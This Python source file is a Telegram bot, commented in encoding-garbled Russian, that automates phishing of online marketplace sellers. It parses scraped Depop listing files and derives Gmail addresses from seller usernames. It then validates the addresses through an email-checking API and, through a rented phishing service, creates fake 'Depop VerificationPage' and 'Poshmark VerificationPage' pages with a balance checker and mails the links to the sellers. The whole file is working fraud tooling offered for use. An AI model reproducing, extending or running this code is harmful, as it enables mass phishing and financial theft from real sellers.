import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import io
# –∫—Ä–∞—Ç–∫–∏–π –º–∞–Ω—É–∞–ª /start - > –≤—ã–±—Ä–∞—Ç—å —Ñ–æ—Ä–º–∞—Ç –¥–ª—è –ø–∞—Ä—Å–µ—Ä–∞ - > –Ω–∞–∂–∞—Ç—å - > —Å–∫–∏–Ω—É—Ç—å –ø–∞—Ä—Å —Ñ–∞–π–ª - > —á–∏–ª–∏—Ç—å - > repeat

TG_BOT_TOKEN = "" #botfather 
MASTER_USER_ID = 123 #—É–Ω–∏–∫–∞–ª—å–Ω—ã–π —Å—Ç–∞—Ç–∏–∫ —Ç–µ–ª–µ–≥—Ä–∞–º
BEAR_TOKEN = ""    #api —Ç–æ–∫–µ–Ω –∏–∑ —Ç–∏–º—ã 
MAILS_SO_API_KEY = ""    #mails.so —Ç–æ–∫–µ–Ω 


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MASTER_USER_ID:
        await update.message.reply_text("‚ùå –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return

    user = update.effective_user
    name = user.first_name or user.username
    greeting = f"Hey, {name}!"

    keyboard = [
        [InlineKeyboardButton("Atom (csv)", callback_data="atom")],
        [InlineKeyboardButton("Rocket (txt)", callback_data="rocket")]
    ]

    await update.message.reply_text(greeting, reply_markup=InlineKeyboardMarkup(keyboard))


async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "rocket":
        await query.edit_message_text("üìÑ –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª senders.txt")
        context.user_data["file_type"] = "rocket"
    elif query.data == "atom":
        await query.edit_message_text("üìÑ –û—Ç–ø—Ä–∞–≤—å—Ç–µ Atom CSV-—Ñ–∞–π–ª")
        context.user_data["file_type"] = "atom"

# rocket - > https://www.depop.com/products/starpowarr-samenext-day-shipping-9c3b|12.50 USD|Same next day shipping Àö ‡ºò‚ô° ‚ãÜÔΩ°Àö  2000‚Äôs Decr|https://media-photos.depop.com/b1/3702946/2948334914_c0ca7780e08c401a8ee6de044975afce/P0.jpg

async def handle_rocket_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = await update.message.document.get_file()
    content = await file.download_as_bytearray()
    text = content.decode("utf-8")
    lines = text.splitlines()

    await update.message.reply_text("üì• ")

    results = []

    for line in lines:
        try:
            url = line.split("|")[0]
            username = url.split("/products/")[1].split("-")[0] 
            email = f"{username}@gmail.com"
            check = requests.get(
                f"https://api.mails.so/v1/validate?email={email}",
                headers={"x-mails-api-key": MAILS_SO_API_KEY}
            ).json()
            data = check.get("data", {})

            if data.get("result") == "deliverable" and data.get("reason") == "accepted_email":


                create = requests.post(
                    "https://vanguard.api-rent.xyz/api/createAd",
                    headers={"Authorization": f"Bearer {BEAR_TOKEN}"},
                    json={
                        "userId": update.effective_user.id,   #—Å—Ç–∞—Ç–∏–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                        "title": "Poshmark VerificationPage",
                        "balanceChecker": True,
                        "photo": "https://i.ibb.co/4Z4vXz7x/13.jpg",
                        "id": "poshmarkverify_us"
                    }
                ).json()
                ad_id = create.get("adId")


                Mailer_response = requests.post(
                    "https://vanguard.api-rent.xyz/api/sendMail",
                    headers={"Authorization": f"Bearer {BEAR_TOKEN}"},
                    json={
                        "mail_service": "your", #or other gosu, your, inbox, hype, catchme, mori, meow, shade (–±–µ–∑ –∑–∞–ø—è—Ç—ã—Ö!!)
                        "email": email,
                        "adId": ad_id,
                        "domainId": 1
                    }
                ).json()

                results.append(f"‚úÖ {email} ‚Äî OK | adId: {ad_id} | Mailer: {Mailer_response}")
            else:
                results.append(f"‚ùå {email} ‚Äî –Ω–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ–º—ã–π")
        except Exception as e:
            results.append(f"‚ö† –û—à–∏–±–∫–∞ –≤ —Å—Ç—Ä–æ–∫–µ '{line}': {e}")

    output_file = io.StringIO("\n".join(results))
    output_file.seek(0)
    await update.message.reply_document(document=output_file, filename="rocket_results.txt")

# atom - > Other Women's Blue and Navy Other-dresses,Other,https://www.depop.com/products/celessteeee-had-bought-it-but-it/,29.75 ,https://www.depop.com/messages/create?userId=29427208&productId=615151760,Celeste  (celessteeee),22:57:10 28-09-2025,-,"San Antonio, United States",https://media-photos.depop.com/b1/29427208/2990922836_861f3389b8e0417b805ccf59166bf20f/P1.jpg,-

async def handle_atom_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = await update.message.document.get_file()
    content = await file.download_as_bytearray()
    text = content.decode("utf-8")
    lines = text.splitlines()

    await update.message.reply_text("üì• –ù–∞—á–∏–Ω–∞—é –æ–±—Ä–∞–±–æ—Ç–∫—É —Ñ–∞–π–ª–∞...")

    results = []

    for line in lines:
        try:
            cols = line.split(",")
            if len(cols) < 3:  
                continue

            url = cols[2].strip()  

            username = url.split("/products/")[1].split("-")[0]
            email = f"{username}@gmail.com"


            check = requests.get(
                f"https://api.mails.so/v1/validate?email={email}",
                headers={"x-mails-api-key": MAILS_SO_API_KEY}
            ).json()
            data = check.get("data", {})

            if data.get("result") == "deliverable" and data.get("reason") == "accepted_email":


                create = requests.post(
                    "https://vanguard.api-rent.xyz/api/createAd",
                    headers={"Authorization": f"Bearer {BEAR_TOKEN}"},
                    json={
                        "userId": update.effective_user.id,
                        "title": "Depop VerificationPage",
                        "balanceChecker": True,
                        "photo": "https://i.ibb.co/4Z4vXz7x/13.jpg",
                        "id": "depopverify_us"
                    }
                ).json()
                ad_id = create.get("adId")


                Mailer_response = requests.post(
                    "https://vanguard.api-rent.xyz/api/sendMail",
                    headers={"Authorization": f"Bearer {BEAR_TOKEN}"},
                    json={
                        "mail_service": "your",
                        "email": email,
                        "adId": ad_id,
                    }
                ).json()

                results.append(f"‚úÖ {email} ‚Äî OK | adId: {ad_id} | Mailer: {Mailer_response}")
            else:
                results.append(f"‚ùå {email} ‚Äî –Ω–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ–º—ã–π")
        except Exception as e:
            results.append(f"‚ö† –û—à–∏–±–∫–∞ –≤ —Å—Ç—Ä–æ–∫–µ '{line}': {e}")

    output_file = io.StringIO("\n".join(results))
    output_file.seek(0)
    await update.message.reply_document(document=output_file, filename="depop_results.txt")


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file_type = context.user_data.get("file_type")
    if file_type == "rocket":
        await handle_rocket_file(update, context)
    elif file_type == "atom":
        await handle_atom_file(update, context)
    else:
        await update.message.reply_text("‚ùå –°–Ω–∞—á–∞–ª–∞ –≤—ã–±–µ—Ä–∏—Ç–µ —Ñ–æ—Ä–º–∞—Ç —á–µ—Ä–µ–∑ /start –∏ –∫–Ω–æ–ø–∫–∏.")

if __name__ == "__main__":
    app = ApplicationBuilder().token(TG_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω‚Ä¶")
    app.run_polling()
